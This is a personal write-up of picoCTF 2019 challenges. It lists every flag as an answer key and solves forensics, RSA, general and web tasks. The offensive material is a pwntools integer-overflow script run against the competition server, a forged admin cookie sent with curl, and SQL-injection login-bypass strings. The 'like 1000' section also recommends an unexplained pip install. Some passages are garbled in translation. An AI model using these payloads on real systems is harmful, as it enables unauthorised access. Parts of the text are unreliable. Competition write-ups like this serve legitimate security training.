# BlueWhale CTF


Title                         	| Category     | Points   | Flag
------------------------------- | ------------ | -------  | ---------------------------------------
unzip  		      				|Forensics	   |50		  | picoCTF{unz1pp1ng_1s_3a5y}
Glory of the Garden  		    |Forensics	   |50		  | picoCTF{more_than_m33ts_the_3y3DBce41ae}
So Meta				  		    |Forensics	   |150		  | picoCTF{s0_m3ta_7ce44fc5}
What Lies Within				|Forensics	   |150		  | picoCTF{h1d1ng_1n_th3_b1t5}
Extensions	(first Blood)		|Forensics	   |150		  | picoCTF{now_you_know_about_extensions}
like 1000 	(2nd blood :(		|Forensics	   |250		  | picoCTF{l0t5_0f_TAR5}
shark on wire 1					|Forensics	   |150		  | picoCTF{StaT31355_636f6e6e}
m00nwalk		      			|Forensics     |250		  |picoCTF{beep_boop_im_in_space}
m00nwalk2		      			|Forensics     |300		  |picoCTF{the_answer_lies_hidden_in_plain_sight}  
shark on wire 2		      		|Forensics     |300		  |picoCTF{p1LLf3r3d_data_v1a_st3g0} 
Investigate Reversing 0	      	|Forensics     |350		  |picoCTF{f0und_1t_fb69f6c2}
Investigate Reversing 1	      	|Forensics     |350		  |picoCTF{An0tha_1_54503d8} 
c0rrupt			      			|Forensics     |250	      |picoCTF{c0rrupt10n_1847995}
whitepages		     			|Forensics     |250		  |picoCTF{not_all_spaces_are_created_equal_178d720252af1af29369e154eca23a95}  
WebNet0			      			|Forensics     |300		  |picoCTF{nongshim.shrimp.crackers} 
rsa-pop-quiz		     		|Crypto	       |200		  |picoCTF{wA8_th4t$_ill3aGal..ob7f0bd39}  
Mr Worldwide 		      		|Crypto	       |200		  |picoCTF{KODIAK_ALASKA}
Whats the Difference	      	|General	   |200		  |picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}
flag_shop		      			|General	   |300		  |picoCTF{m0n3y_bag5_325fcd2e}
mus1c 			      			|General	   |300		  |picoCTF{rrrocknrn0113r}
1_wanna_b3_a_r0ck5tar	     	|General	   |350		  |picoCTF{BONJOVI}
Open-to-Admins		      		|Web	       |200		  |picoCTF{0p3n_t0_adm1n5_b6ea8359} 
picobrowser 		      		|Web	       |200		  |picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}
Irish-Name-Repo 1 	      		|Web	       |300		  |picoCTF{s0m3_SQL_34865514}
Irish-Name-Repo 2 	      		|Web	       |350		  |picoCTF{m0R3_SQL_plz_015815e2}
Irish-Name-Repo 3	      		|Web	       |400		  |picoCTF{3v3n_m0r3_SQL_ef7eac2f}


All things considered I got 8801 in a little less then 3 days so I sticked to what i was comfortable   
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/score.PNG)  
## unzip (Forensics/50)
unzip the image and open it in 29a.ch  
https://29a.ch/photo-forensics/#forensic-magnifier  
voila~!     
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/unzip.PNG)  
picoCTF{unz1pp1ng_1s_3a5y}  

## Glory of the Garden (Forensics/50)   
flag is hidden so do a simple string extraction...   
picoCTF{more_than_m33ts_the_3y3DBce41ae}    
 
## So Meta (Forensics/150)    
again flag is hidden so do a simple string extraction...   
picoCTF{s0_m3ta_7ce44fc5}  
  
## What Lies Within (Forensics/150)  
use zsteg to find a decoding   
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/whatlieswithin.PNG)   
picoCTF{h1d1ng_1n_th3_b1t5}     

## Extensions (Forensics/150)   
open the file looks like a png and its not currupted, so rename and open   
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/extensions.PNG)    
picoCTF{now_you_know_about_extensions}  

## like 1000 (Forensics/250)
I really wanted to get the 1st blood for this so i didnt write a bash script i simply used an autoclicker and took 20 seconds   
but i know i should have used something like the well known 'extractnested.py' script pip install nested.tar.archives.extractor==1.1    
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/like1000.PNG)    
picoCTF{l0t5_0f_TAR5}   

## shark on wire 1 (Forensics/150)
open in wireshark and 'udp.stream eq 6' follow the UDP stream and voila  
picoCTF{StaT31355_636f6e6e}  


## m00nwalk (Forensics 250)
It seems to be an audio file called SSTV (Slow Scan TV) used in amateur radio image communication.  
It seems that Luna 3 ( the unmanned lunar explorer in the Soviet Union ) also used SSTV to transmit images.  
The following tools were used to decode audio into images.  
http://users.belgacom.net/hamradio/rxsstv.htm   
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/moon0.PNG) 
When `Scottie 1` recording with RX option , the following image was output.  
The image quality will be rough unless the environment is capable of recording with clear noise and clear sound      
flag = picoCTF{beep_boop_im_in_space}   

## m00nwalk2 (Forensics 300)
It looks like an audio file in a format called SSTV. This time, RX-SSTV was used for decoding.   
we'll be using http://users.belgacom.net/hamradio/rxsstv.htm   
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/images/moon1.PNG)      
`message.wav` When decoding, it became as follows. It looks like the same image as the previous m00nwalk.   
Next `clue1.wav`, when it was decoded using RX-SSTV, it became as follows.    
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/moon2.PNG)    
This image had a password ( hidden_stegosaurus) written on it. `message.wav` It seems that another data is hidden by steganography .    
Besides, `clue2.wav` killing `clue3.wav` also tried to decode, I did not know what it means. 
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/moon3.PNG)      
hidden_stegosaurusI found out that the password was , so I tried extracting data with steghide as a test. Then the flag was obtained.   
```bash 
$ steghide extract -sf message.wav -p hidden_stegosaurus -xf output.txt  
wrote extracted data to "output.txt".  
$ cat output.txt 
picoCTF{the_answer_lies_hidden_in_plain_sight}  
```

## shark on wire 2 (Forensics 300)   
![](https://github.com/OlivierLaflamme/CTF/blob/master/PicoCTF2019/images/shark.PNG)   
When I looked at the packet with Wireshark , I was able to confirm the start and end strings on port 22.   
udp.port == 22 After filtering and observing, it was found that only the source port number and checksum changed in each packet     
Looking at the source port number, I noticed that the source port number of the next packet that had a start `5112` is `p` the ASCII  
code of subtracting 5000 `112`. After that, collecting the source port number of each packet and subtracting 5001 became a flag  
flag = picoCTF{p1LLf3r3d_data_v1a_st3g0}  

## Investigate Reversing 0 (Forensics 300)  
You can see a string like a flag at the end of the image file. The other file was an ELF file. When opened in Ghidra, it was as follows.    
It seems to be added to the image file in the following procedure.  
Read data from flag.txt.  
The 0th to 5th bytes are output as they are.  
Add 6 to the 6th to 14th bytes.  
For the 15th byte, add -3.  
The 16th to 25th bytes are output as they are.  
If the data at the end of the image file is recalculated in the reverse order above, it becomes a flag.  
flag = picoCTF{f0und_1t_fb69f6c2}  

## Investigate Reversing 1 (Forensics 350)
`mystery` Opening with Ghidra, it became as follows.
`flag.txt` seems to be a process to output the data at the end of three PNG files.  
When the flag was appropriately created mysteryand executed, the following three files were generated.  
```bash 
$ echo -n "picoCTF{123456789abcdef}XXXXX" > flag.txt
$ ./mystery
$ hexdump -C mystery.png 
00000000 43 46 7b 31 32 38 39 61 62 63 64 65 66 7d 58 58 | CF {1289abcdef} XX |
00000010
$ hexdump -C mystery2.png 
00000000  85 73                                             |.s|
00000002
$ hexdump -C mystery3.png 
00000000  69 63 54 33 34 35 36 37                           |icT34567|
00000008
```
After that, if you rearrange the character strings at the end of the original image file with reference to the output order, it will be as follows.  
picoCTF{An0tha_1_54503d8}  

## c0rrupt  (Forensics 250)
Open it with a binary editor and modify the following items
00000000  89 65 4e 34 0d 0a b0 aa 00 00 00 0d 43 22 44 52  |.eN4..°ª....C"DR|  
?  
00000000  89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52  |.PNG........IHDR|  
and   
00000050 52 24 f0 aa aa ff a5 ab 44 45 54 78 5e ec bd 3f | R $ ðªªÿ ¥ «DETx ^ ì½? |  
?  
00000050 52 24 f0 aa aa ff a5 49 44 41 54 78 5e ec bd 3f | R $ ðªªÿ ¥ IDATx ^ ì½? |   
When opening a modified PNG file, a flag was written.  
flag = picoCTF{c0rrupt10n_1847995}


## Whitepages (Forensics 250)		     
Open a Binary editor If you look at, \xe2\x80\x83and the \x20two patterns of looks.  
\x20Is, ASCII represents a space of code.  
\xe2\x80\x83I googled about and found that it was " Unicode Character 'EM SPACE' (U + 2003)".  
lets solve this with the following script  
```python3
import numpy as np
def solve(fn='whitepages.txt'):
    with open(fn) as f:
        data = f.read()

    xs = np.packbits([x == ' ' for x in data])
    return bytes(xs)
    print(solve())
```
flag = picoCTF{not_all_spaces_are_created_equal_178d720252af1af29369e154eca23a95}  

## WebNet0 (Forensics 350)
The pcap file and key were passed. When pcap is opened, it is encrypted with TLS.   
When the RSA key was set in Wireshark and updated, HTTP communication was confirmed.   
When checking the contents of the packet, a flag was written.   
flag = picoCTF{nongshim.shrimp.crackers}


## rsa-pop-quiz  (Steno 200)
==Y==  
q : 60413  
p : 76753  

n = 4636878989  

==Y==  
p : 54269  
n : 5051846941  

q = 93089  

==N==  
 
==Y==  
q : 66346  
p : 12610  

totient(n) = 836623060?  

==Y==  
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717  
e : 3  
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331  

ciphertext = 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813  

==N==  

==Y==  
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559  
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433  
e : 65537

d = 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729  

==Y==  
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433  
ciphertext : 9276182891752530901219927412073143671948875482138883542938401204867776171605127572134036444953137790745003888189443976475578120144429490705784649507786686788217321344885844827647654512949354661973611664872783393501992112464825441330961457628758224011658785082995945612195073191601952238361315820373373606643521463466376095236371778984942891123936191796720097900593599447528583257806196551724676380135110693228330934418147759387990754368525068685861547977993085149359162754890674487823080750579601100854795031284533864826255207300350679553486505961837349042778851010569582458629638648589442067576234798724906377157351  
e : 65537  
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239  

Plaintext = 14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893  

==SCRIPTS==  
```python3
def egcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = egcd(b % a, a)
    return g, x - (b // a) * y, y

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('Modular inverse does not exist')
    else:
        return x % m

if __name__ == '__main__':
    p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
    q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
    e = 65537

    phi = (p-1) * (q-1)
    d = modinv(e, phi)
    print(d)
```

```python3
from pwn import *
import gmpy2

p=153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
e=65537
n=23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
c=9276182891752530901219927412073143671948875482138883542938401204867776171605127572134036444953137790745003888189443976475578120144429490705784649507786686788217321344885844827647654512949354661973611664872783393501992112464825441330961457628758224011658785082995945612195073191601952238361315820373373606643521463466376095236371778984942891123936191796720097900593599447528583257806196551724676380135110693228330934418147759387990754368525068685861547977993085149359162754890674487823080750579601100854795031284533864826255207300350679553486505961837349042778851010569582458629638648589442067576234798724906377157351
q=n/p
tn=(p-1)*(q-1)
d=gmpy2.invert(e,tn)
m=pow(c,d,n)
print (m)
print str(hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893))[2:].decode('hex')
```
flag = picoCTF{wA8_th4t$_ill3aGal..ob7f0bd39}  

## Mr Worldwide 
if the title didnt spoil this annyoing challenge enough It seems to be the latitude and longitude of GPS . When searching on GoogleMap, the initial letter of the city was a flag.  

flag = picoCTF{KODIAK_ALASKA}

## Whats the Difference (General 200)
When I took diff with the following command, the character string in the difference was a flag. Note that the difference between 1 and l is difficult to understand.    
```bash
$ hexdump -C kitters.jpg > kitters.txt
$ hexdump -C cattos.jpg > cattos.txt
$ colordiff kitters.txt cattos.txt | grep -v "\-\-\-"
```
flag = picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}

## flag_shop (General 300)
If you connect to 2019shell1.picoctf.com:25858 with netcat, the shop will come out.   
It seems that 100,000 $ is needed to buy the flag. If you make an integer overflow when you buy something, you can increase your money.   
The flag can be acquired by executing the following script   
```python3
from pwn import *

def main():
    p = remote("2019shell1.picoctf.com", 25858)

    balance = 1100
    while balance < 100000:
        p.sendlineafter("Enter a menu selection", str(2))
        p.sendlineafter("2. 1337 Flag", str(1))
        p.sendlineafter("These knockoff Flags cost 900 each, enter desired quantity", str(0x7fffffff))

        p.readuntil("Your current balance after transaction: ")
        read_data = p.readuntil("\n").decode("utf-8").strip()
        balance = int(read_data)

        log.info("balance: {}".format(balance))

    p.sendlineafter("Enter a menu selection", str(2))
    p.sendlineafter("2. 1337 Flag", str(2))
    p.sendlineafter("Enter 1 to buy one", str(1))

    p.interactive()

if __name__ == "__main__":
    main()
```
```bash
$ python solve.py 
[+] Opening connection to 2019shell1.picoctf.com on port 25858: Done
[*] balance: 2000
[*] balance: 2900

Omitted
[*] balance: 99200
[*] balance: 100100
[*] Switching to interactive mode
YOUR FLAG IS: picoCTF{m0n3y_bag5_325fcd2e}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

Enter a menu selection
[*] Got EOF while reading in interactive
```
voila!   
flag = picoCTF{m0n3y_bag5_325fcd2e}  

## mus1c (General 300)
After investigating various things, I learned that there seems to be a programming language called Rockstar language .    
This time, it was executed using a tool called KaiserRuby.  https://github.com/marcinruszkiewicz/kaiser-ruby     
```bash
$ gem install kaiser-ruby pry
$ kaiser-ruby execute lyrics.txt 
114
114
114
111
99
107
110
114
110
48
49
49
51
114
```
When the numerical value of the above execution result is converted to a character as a decimal number, rrrocknrn0113r is obtained.   
flag = picoCTF{rrrocknrn0113r}   


## 1_wanna_b3_a_r0ck5tar (General 350)
It seems to be written in a programming language called Rockstar language as well as the problem of mus1c . Again, I used a tool called KaiserRuby.     
Since it could not be executed, it was converted to ruby.  
```bash
$ kaiser-ruby transpile lyrics.txt
@rocknroll = true
@silence = false
@a_guitar = 19
@tommy = 44
@music = 160
print '> '
__input = $stdin.gets.chomp
@the_music = Float(__input) rescue __input
if @the_music == @a_guitar
  puts ("Keep on rocking!").to_s
  print '> '
__input = $stdin.gets.chomp
@the_rhythm = Float(__input) rescue __input
  if @the_rhythm - @music == nil
    @tommy = 66
    puts (@tommy).to_s
    @music = 79
    @jamming = 78
    puts (@music).to_s
    puts (@jamming).to_s
    @tommy = 74
    puts (@tommy).to_s
    @tommy = 79
    puts (@tommy).to_s
    @rock = 86
    puts (@rock).to_s
    @tommy = 73
    puts (@tommy).to_s
    break
    puts ("Bring on the rock!").to_s
  else
    break
  end
end
``` 
There is a process that outputs one character at a time with puts. 66 79 78 74 79 86 73Converts to to a character BONJOVI      
flag = picoCTF{BONJOVI}    

## Open-to-admins (Web 200)
you can also use EditThisCookie browser extension by i use firefox   
admin, true    
time, 1400  
```bash
curl -v 'http://2019shell1.picoctf.com:32249/flag' -H 'Cookie: admin=True;time=1400'
```   
flag = picoCTF{0p3n_t0_adm1n5_b6ea8359}   

## picobrowser (Web 200)
When UserAgent was changed to picobrowser with Chrome extension User-Agent Switcher for Chrome , the flag was displayed.   
the easiest way is useing this chrome extension and creating a picobrowser profile https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg/related?hl=ja   
flag = picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}  

## Irish-Name-Repo 1 (Web 300)   
There is an Admin Login page. When the user name was ' or 'A' = 'A' --    
entered and the "Login" button was pressed, the flag was output.    
fllag = picoCTF{s0m3_SQL_34865514}   

## Irish-Name-Repo 1 (Web 350)
There is an Admin Login page. When the user name was admin' -- entered and the "Login" button was pressed, the flag was output.   
flag = picoCTF{m0R3_SQL_plz_015815e2}   

## Irish-Name-Repo 3 (Web 400) 
There is an Admin Login page. When I press F12 and look at the html file, the following debugging tags were embedded.

<input type="hidden" name="debug" value="0">
If you change the value to 1 and enter "abcdefghijklmnopqrstuvwxyz" as the password, the output is as follows:   

password: abcdefghijklmnopqrstuvwxyz   
SQL query: SELECT * FROM admin where password = 'nopqrstuvwxyzabcdefghijklm'   

Login failed.   
It seems that characters are shifted to the entered value with ROT13.
' or 'a' = 'To become so, ' be 'n' = 'nand if you enter the flag has been output.   
flag = picoCTF{3v3n_m0r3_SQL_ef7eac2f}

